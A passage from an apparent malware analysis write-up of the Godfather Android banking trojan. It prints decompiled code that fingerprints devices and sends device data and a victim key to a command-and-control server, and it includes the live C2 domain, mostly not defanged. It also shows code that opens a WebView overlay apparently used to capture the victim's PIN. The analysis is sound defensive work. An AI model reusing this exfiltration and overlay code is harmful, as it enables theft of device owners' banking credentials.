                <span class="k">throw</span> <span class="k">new</span> <span class="nf">IOException</span><span class="o">((</span><span class="s">"Unexpected code"</span><span class="o">)</span> <span class="o">+</span> <span class="n">response</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="nc">String</span> <span class="n">tele</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="na">body</span><span class="o">().</span><span class="na">string</span><span class="o">();</span>
            <span class="nc">Pattern</span> <span class="n">pattern</span> <span class="o">=</span> <span class="nc">Pattern</span><span class="o">.</span><span class="na">compile</span><span class="o">((</span><span class="err">'</span><span class="o">&lt;</span><span class="n">meta</span> <span class="n">property</span><span class="o">=</span><span class="err">\</span><span class="s">"og:description\" content=\"(.*?)\"&gt;'), 32);
            Matcher matcher = pattern.matcher(tele);
            while (matcher.find()) {
                Sandrakottos(context, ("</span><span class="n">min</span><span class="err">"</span><span class="o">),</span> <span class="n">matcher</span><span class="o">.</span><span class="na">group</span><span class="o">(</span><span class="mi">1</span><span class="o">));</span>
            <span class="o">}</span>
            <span class="n">response</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>


</code></pre></div></div>

<h4 id="rarefeatured">Rarefeatured</h4>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img18.png" alt="Figure 18 - Rarefeatured Class" /></p>

<p>This function prepares and sends an http request.
This function is confusing because it uses two variables called effluvias and effluvias2 with values “alt” and “ky” respectively, ( Effluvias is the same name as the function that is used to decipher strings). 
A URL is constructed by concatenating the result of the Uriiah method applied to the result of the bedamned method with the key “min” and the string “callnew.php”.
On the Shared Preference we can see</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"min"</span><span class="o">&gt;</span><span class="n">zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ</span><span class="o">/</span><span class="nc">FWvMgQ</span><span class="o">==&lt;/</span><span class="n">string</span><span class="o">&gt;</span>
</code></pre></div></div>
<p>Deciphered with Uriiah function give us:
https://yukoramparata.top/zamra/aaa/ , adding the string “callnew.php”: 
https://yukoramparata[.]top/zamra/aaa/callnew[.]php</p>

<p>The rarefeatured function appears to prepare and send an HTTP POST request including a set of data retrieved from the SharedPreference</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">rarefeatured</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">,</span> <span class="nc">String</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">rarefeatured</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">,</span> <span class="nc">String</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">String</span> <span class="n">effluvias</span> <span class="o">=</span> <span class="o">(</span><span class="s">"alt"</span><span class="o">);</span>
        <span class="nc">String</span> <span class="n">effluvias2</span> <span class="o">=</span> <span class="o">(</span><span class="s">"ky"</span><span class="o">);</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">HashMap</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="nc">String</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">&lt;&gt;();</span>
            <span class="n">p</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">effluvias2</span><span class="o">,</span> <span class="n">bedamned</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">effluvias2</span><span class="o">));</span>
            <span class="n">p</span><span class="o">.</span><span class="na">put</span><span class="o">((</span><span class="s">"tg"</span><span class="o">),</span> <span class="n">hagiography</span><span class="o">(</span><span class="n">bedamned</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="o">(</span><span class="s">"tag"</span><span class="o">))));</span>
            <span class="n">p</span><span class="o">.</span><span class="na">put</span><span class="o">((</span><span class="s">"cy"</span><span class="o">),</span> <span class="n">bedamned</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="o">(</span><span class="s">"locale"</span><span class="o">)));</span>
            <span class="n">p</span><span class="o">.</span><span class="na">put</span><span class="o">((</span><span class="s">"model"</span><span class="o">),</span> <span class="n">bedamned</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="o">(</span><span class="s">"smm"</span><span class="o">)));</span>
            <span class="n">p</span><span class="o">.</span><span class="na">put</span><span class="o">((</span><span class="s">"nw"</span><span class="o">),</span> <span class="o">(</span><span class="s">"true"</span><span class="o">));</span>
            <span class="n">p</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">effluvias</span><span class="o">,</span> <span class="n">bedamned</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">effluvias</span><span class="o">));</span>
            <span class="n">p</span><span class="o">.</span><span class="na">put</span><span class="o">((</span><span class="s">"eys"</span><span class="o">),</span> <span class="n">e</span><span class="o">);</span>
            <span class="n">p</span><span class="o">.</span><span class="na">put</span><span class="o">((</span><span class="s">"rpn"</span><span class="o">),</span> <span class="n">bedamned</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="o">(</span><span class="s">"psv"</span><span class="o">)));</span>
            <span class="n">veepees</span><span class="o">.</span><span class="na">undissuadably</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="nc">Uriiah</span><span class="o">(</span><span class="n">bedamned</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="o">(</span><span class="s">"min"</span><span class="o">)))</span> <span class="o">+</span> <span class="o">(</span><span class="s">"callnew.php"</span><span class="o">),</span> <span class="n">p</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e2</span><span class="o">)</span> <span class="o">{</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div></div>

<table>
  <tbody>
    <tr>
      <td>alt</td>
      <td>com.melting.mantaught</td>
    </tr>
    <tr>
      <td>tg</td>
      <td>0401EN</td>
    </tr>
    <tr>
      <td>cy</td>
      <td>en</td>
    </tr>
    <tr>
      <td>model</td>
      <td>13 A50</td>
    </tr>
    <tr>
      <td>nw</td>
      <td>true</td>
    </tr>
    <tr>
      <td>ky</td>
      <td>0hh2fpkr5zt72</td>
    </tr>
  </tbody>
</table>

<p>Checking the requests from our device proxy:</p>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img19.png" alt="Figure 19 - Http Request Example" /></p>

<h3 id="step4--retrieve-shared-preference-and-talking-with-c2">Step4 : Retrieve Shared Preference and Talking with C2</h3>

<p>The data it sends is all data that this malware retrieves in different ways, specifically:</p>

<h4 id="jj">JJ</h4>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img20.png" alt="Figure 20 - JJ Class" /></p>

<p>The JJ function collects device information (manufacturer and model) and sends a specific code associated with these details using a call to Tamarix. Sandrakottos. 
This could be used to keep track of the type of device that is using the app or to send specific information to the app server for device management or profiling.
Ex. Using an emulator for analysis is returned the value device 2</p>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img21.png" alt="Figure 21 - Device Check Shared Preference" /></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">JJ</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">)</span> <span class="o">{</span>
    <span class="nc">String</span> <span class="n">r</span><span class="o">;</span>
    <span class="nc">String</span> <span class="n">d</span> <span class="o">=</span> <span class="nc">Build</span><span class="o">.</span><span class="na">MANUFACTURER</span> <span class="o">+</span> <span class="nc">Build</span><span class="o">.</span><span class="na">MODEL</span><span class="o">;</span>
 
    <span class="k">if</span> <span class="o">(</span><span class="n">d</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"HUAWEI"</span><span class="o">))</span> <span class="o">{</span>
        <span class="n">r</span> <span class="o">=</span> <span class="s">"0"</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">d</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"Pixel"</span><span class="o">))</span> <span class="o">{</span>
        <span class="n">r</span> <span class="o">=</span> <span class="s">"1"</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">d</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="mi">2</span><span class="o">).</span><span class="na">contains</span><span class="o">(</span><span class="s">"LG"</span><span class="o">))</span> <span class="o">{</span>
        <span class="n">r</span> <span class="o">=</span> <span class="s">"3"</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">d</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"Xiaomi"</span><span class="o">))</span> <span class="o">{</span>
        <span class="n">r</span> <span class="o">=</span> <span class="s">"5"</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">d</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"OPPO"</span><span class="o">)</span> <span class="o">||</span> <span class="n">d</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"CPH"</span><span class="o">))</span> <span class="o">{</span>
        <span class="n">r</span> <span class="o">=</span> <span class="s">"4"</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="n">r</span> <span class="o">=</span> <span class="s">"2"</span><span class="o">;</span>
    <span class="o">}</span>
 
    <span class="nc">Tamarix</span><span class="o">.</span><span class="na">Sandrakottos</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="s">"device"</span><span class="o">,</span> <span class="n">r</span><span class="o">);</span>

</code></pre></div></div>

<h4 id="untraffickable">Untraffickable</h4>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img22.png" alt="Figure 22 - Untraffickable Class" /></p>

<p>It checks if the device is of a certain type (device equals “4”) via the Tamarix.bedamned.
If true, it sets a value of “true” in the context with the key “opi”.
Gets the intent and retrieve two values (str and id) passed through the intent. 
If str is not null or empty, it sets a value “true” in the context with the key “rbt”.
Configure a WebView with JavaScript enabled and a specific User-Agent.
Extends WebViewClient and handles web page loading events. 
The method onPagefinished: if the URL contains “STOP”, it performs a series of actions:
•   Loads a blank page (About:blank)
•   Updates some keys in the context with new values.
•   Finish the activity. (finish)
•   Extends webChromeClient
•   Handles JavaScript Alert (onJsAlert)
Otherwise, it checks the device type again and updates the keys in the context with “false” value. 
This function returns false when the “back” button is pressed</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">untraffickable</span> <span class="kd">extends</span> <span class="nc">Activity</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="nc">String</span> <span class="n">prevailed</span><span class="o">;</span>
 
    <span class="nd">@Override</span>
    <span class="nd">@SuppressLint</span><span class="o">({</span><span class="s">"SetJavaScriptEnabled"</span><span class="o">})</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
    <span class="o">}</span>
 
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onStart</span><span class="o">()</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">.</span><span class="na">onStart</span><span class="o">();</span>
        <span class="kt">boolean</span> <span class="n">equals</span> <span class="o">=</span> <span class="nc">Tamarix</span><span class="o">.</span><span class="na">bedamned</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">(),</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"device"</span><span class="o">)).</span><span class="na">equals</span><span class="o">(</span><span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"4"</span><span class="o">));</span>
        <span class="nc">String</span> <span class="n">effluvias</span> <span class="o">=</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"true"</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">equals</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">Tamarix</span><span class="o">.</span><span class="na">Sandrakottos</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">(),</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"opi"</span><span class="o">),</span> <span class="n">effluvias</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
        <span class="nc">String</span> <span class="n">str</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getStringExtra</span><span class="o">(</span><span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"str"</span><span class="o">));</span>
        <span class="n">prevailed</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getStringExtra</span><span class="o">(</span><span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"id"</span><span class="o">));</span>
        <span class="k">if</span> <span class="o">(!</span><span class="n">str</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="nc">HttpUrl</span><span class="o">.</span><span class="na">FRAGMENT_ENCODE_SET</span><span class="o">)</span> <span class="o">||</span> <span class="n">str</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">Tamarix</span><span class="o">.</span><span class="na">Sandrakottos</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">(),</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"rbt"</span><span class="o">),</span> <span class="n">effluvias</span><span class="o">);</span>
            <span class="nc">WebView</span> <span class="n">wv</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">WebView</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
            <span class="n">wv</span><span class="o">.</span><span class="na">getSettings</span><span class="o">().</span><span class="na">setJavaScriptEnabled</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
            <span class="n">wv</span><span class="o">.</span><span class="na">getSettings</span><span class="o">().</span><span class="na">setUserAgentString</span><span class="o">(</span><span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"Mozilla/5.0 (Linux; Android 9; SM-J730F Build/PPR12.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36"</span><span class="o">));</span>
            <span class="n">wv</span><span class="o">.</span><span class="na">setWebViewClient</span><span class="o">(</span><span class="k">new</span> <span class="nc">MyWebViewClient</span><span class="o">());</span>
            <span class="n">wv</span><span class="o">.</span><span class="na">setWebChromeClient</span><span class="o">(</span><span class="k">new</span> <span class="nc">MyWebChromeClient</span><span class="o">());</span>
            <span class="n">wv</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="nc">Tamarix</span><span class="o">.</span><span class="na">Uriiah</span><span class="o">(</span><span class="nc">Tamarix</span><span class="o">.</span><span class="na">bedamned</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"min"</span><span class="o">)))</span> <span class="o">+</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"rx/f.php?f="</span><span class="o">)</span> <span class="o">+</span> <span class="n">str</span> <span class="o">+</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"&amp;p="</span><span class="o">)</span> <span class="o">+</span> <span class="nc">Tamarix</span><span class="o">.</span><span class="na">bedamned</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">(),</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"ky"</span><span class="o">))</span> <span class="o">+</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"|"</span><span class="o">)</span> <span class="o">+</span> <span class="nc">Locale</span><span class="o">.</span><span class="na">getDefault</span><span class="o">().</span><span class="na">getLanguage</span><span class="o">().</span><span class="na">toLowerCase</span><span class="o">());</span>
            <span class="n">setContentView</span><span class="o">(</span><span class="n">wv</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
 
    <span class="kd">public</span> <span class="kd">class</span> <span class="nc">MyWebViewClient</span> <span class="kd">extends</span> <span class="nc">WebViewClient</span> <span class="o">{</span>
        <span class="nd">@Override</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onPageFinished</span><span class="o">(</span><span class="nc">WebView</span> <span class="n">view</span><span class="o">,</span> <span class="nc">String</span> <span class="n">url</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">url</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"STOP"</span><span class="o">)))</span> <span class="o">{</span>
                <span class="n">view</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"about:blank"</span><span class="o">));</span>
                <span class="nc">Context</span> <span class="n">applicationContext</span> <span class="o">=</span> <span class="n">untraffickable</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">getApplicationContext</span><span class="o">();</span>
                <span class="nc">String</span> <span class="n">effluvias</span> <span class="o">=</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"is"</span><span class="o">);</span>
                <span class="nc">String</span> <span class="n">rep</span> <span class="o">=</span> <span class="nc">Tamarix</span><span class="o">.</span><span class="na">bedamned</span><span class="o">(</span><span class="n">applicationContext</span><span class="o">,</span> <span class="n">effluvias</span><span class="o">);</span>
                <span class="nc">Tamarix</span><span class="o">.</span><span class="na">Sandrakottos</span><span class="o">(</span><span class="n">untraffickable</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">getApplicationContext</span><span class="o">(),</span> <span class="n">effluvias</span><span class="o">,</span> <span class="n">rep</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="n">untraffickable</span><span class="o">.</span><span class="na">prevailed</span><span class="o">,</span> <span class="nc">HttpUrl</span><span class="o">.</span><span class="na">FRAGMENT_ENCODE_SET</span><span class="o">));</span>
                <span class="nc">Tamarix</span><span class="o">.</span><span class="na">Sandrakottos</span><span class="o">(</span><span class="n">untraffickable</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">getApplicationContext</span><span class="o">(),</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"opo"</span><span class="o">),</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"true"</span><span class="o">));</span>
                <span class="nc">Tamarix</span><span class="o">.</span><span class="na">Sandrakottos</span><span class="o">(</span><span class="n">untraffickable</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">getApplicationContext</span><span class="o">(),</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"psv"</span><span class="o">),</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"0"</span><span class="o">));</span>
                <span class="nc">Tamarix</span><span class="o">.</span><span class="na">Sandrakottos</span><span class="o">(</span><span class="n">untraffickable</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">getApplicationContext</span><span class="o">(),</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"rbt"</span><span class="o">),</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"false"</span><span class="o">));</span>
                <span class="n">untraffickable</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">finish</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">}</span>
 
        <span class="nd">@Override</span>
        <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">shouldOverrideUrlLoading</span><span class="o">(</span><span class="nc">WebView</span> <span class="n">view</span><span class="o">,</span> <span class="nc">String</span> <span class="n">url</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
 
    <span class="kd">public</span> <span class="kd">class</span> <span class="nc">MyWebChromeClient</span> <span class="kd">extends</span> <span class="nc">WebChromeClient</span> <span class="o">{</span>
        <span class="nd">@Override</span>
        <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">onJsAlert</span><span class="o">(</span><span class="nc">WebView</span> <span class="n">view</span><span class="o">,</span> <span class="nc">String</span> <span class="n">url</span><span class="o">,</span> <span class="nc">String</span> <span class="n">message</span><span class="o">,</span> <span class="nc">JsResult</span> <span class="n">result</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
 
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onStop</span><span class="o">()</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">.</span><span class="na">onStop</span><span class="o">();</span>
        <span class="kt">boolean</span> <span class="n">equals</span> <span class="o">=</span> <span class="nc">Tamarix</span><span class="o">.</span><span class="na">bedamned</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">(),</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"device"</span><span class="o">)).</span><span class="na">equals</span><span class="o">(</span><span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"4"</span><span class="o">));</span>
        <span class="nc">String</span> <span class="n">effluvias</span> <span class="o">=</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"false"</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">equals</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">Tamarix</span><span class="o">.</span><span class="na">Sandrakottos</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">(),</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"opi"</span><span class="o">),</span> <span class="n">effluvias</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="nc">Tamarix</span><span class="o">.</span><span class="na">Sandrakottos</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">(),</span> <span class="n">cirrofilum</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"rbt"</span><span class="o">),</span> <span class="n">effluvias</span><span class="o">);</span>
    <span class="o">}</span>
 
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onDestroy</span><span class="o">()</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">.</span><span class="na">onDestroy</span><span class="o">();</span>
    <span class="o">}</span>
 
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">onKeyDown</span><span class="o">(</span><span class="kt">int</span> <span class="n">keyCode</span><span class="o">,</span> <span class="nc">KeyEvent</span> <span class="n">event</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
    <span class="o">}</span>
 
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onBackPressed</span><span class="o">()</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">.</span><span class="na">onBackPressed</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>

</code></pre></div></div>

<p>Analyzing the “construction” of the url will be:
Within the method wv.loadrl:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">wv</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span>
    <span class="nc">Tamarix</span><span class="o">.</span><span class="na">Uriiah</span><span class="o">(</span><span class="nc">Tamarix</span><span class="o">.</span><span class="na">bedamned</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="s">"min"</span><span class="o">))</span> <span class="o">+</span> 
    <span class="s">"rx/f.php?f="</span> <span class="o">+</span> <span class="n">str</span> <span class="o">+</span> 
    <span class="s">"&amp;p="</span> <span class="o">+</span> <span class="nc">Tamarix</span><span class="o">.</span><span class="na">bedamned</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">(),</span> <span class="s">"ky"</span><span class="o">)</span> <span class="o">+</span> 
    <span class="s">"|"</span> <span class="o">+</span> <span class="nc">Locale</span><span class="o">.</span><span class="na">getDefault</span><span class="o">().</span><span class="na">getLanguage</span><span class="o">().</span><span class="na">toLowerCase</span><span class="o">()</span>
<span class="o">);</span>


</code></pre></div></div>
<p>Tamarix.Uriiah(Tamarix.bedamned(this, “min”)):
Uriiah method takes a value obtained from Tamarix.bedamned(this, “min”) and returns a fixed part of the URL.
So https://yukoramparata.top/zamra/aaa/
“rx/f.php?f=” + str: adds the parameters “f” with the value obtained from the intent (str).
“&amp;p=” + Tamarix.bedamned(getApplicationContext(), “ky”): adds the parameter “p” with a value obtained from  Tamarix.bedamned.</p>

<p>”|” + Locale.getDefault().getLanguage().toLowerCase(): Adds the device language as a parameter in the URL.
The parameters str and id could be generated by speculatd function (in detalis below).
Below the code of the speculated function</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
                        <span class="nc">Intent</span> <span class="n">dialogIntent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">(</span><span class="n">ctx</span><span class="o">,</span> <span class="n">untraffickable</span><span class="o">.</span><span class="na">class</span><span class="o">)</span>
                            <span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"str"</span><span class="o">,</span> <span class="s">"ALL_PIN"</span><span class="o">)</span>
                            <span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"id"</span><span class="o">,</span> <span class="s">"1500"</span><span class="o">);</span>



</code></pre></div></div>

<p>The result:
https://yukoramparata.top/zamra/aaa/rx/f.php?f=ALL_PIN&amp;p=0hh2fpkr5zt72|en</p>

<h4 id="speculated">Speculated</h4>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img23.png" alt="Figure 23 - Speculated Class" /></p>

<p>The function gets an instance of KeyguardManager, it checks whether the device is locked using the isKeyguardLocked() 
If the device is not locked (locked is false), the function creates a Timer object. 
It defines an anonymous TimerTask that performs a periodic task</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">speculated</span><span class="o">(</span><span class="kd">final</span> <span class="nc">Context</span> <span class="n">ctx</span><span class="o">)</span> <span class="o">{</span>
    <span class="nc">KeyguardManager</span> <span class="n">km</span> <span class="o">=</span> <span class="o">(</span><span class="nc">KeyguardManager</span><span class="o">)</span> <span class="n">ctx</span><span class="o">.</span><span class="na">getSystemService</span><span class="o">(</span><span class="s">"keyguard"</span><span class="o">);</span>
    <span class="kt">boolean</span> <span class="n">locked</span> <span class="o">=</span> <span class="n">km</span><span class="o">.</span><span class="na">isKeyguardLocked</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(!</span><span class="n">locked</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="kd">final</span> <span class="nc">Timer</span> <span class="n">timerObj</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Timer</span><span class="o">();</span>
            <span class="nc">TimerTask</span> <span class="n">timerTask</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TimerTask</span><span class="o">()</span> <span class="o">{</span>
                <span class="nd">@Override</span>
                <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
                    <span class="k">if</span> <span class="o">(</span><span class="nc">Tamarix</span><span class="o">.</span><span class="na">bedamned</span><span class="o">(</span><span class="n">ctx</span><span class="o">,</span> <span class="s">"opi"</span><span class="o">).</span><span class="na">contains</span><span class="o">(</span><span class="s">"false"</span><span class="o">))</span> <span class="o">{</span>
                        <span class="nc">String</span> <span class="n">bedamned</span> <span class="o">=</span> <span class="nc">Tamarix</span><span class="o">.</span><span class="na">bedamned</span><span class="o">(</span><span class="n">ctx</span><span class="o">,</span> <span class="s">"opo"</span><span class="o">);</span>
                        <span class="nc">String</span> <span class="n">effluvias</span> <span class="o">=</span> <span class="s">"true"</span><span class="o">;</span>
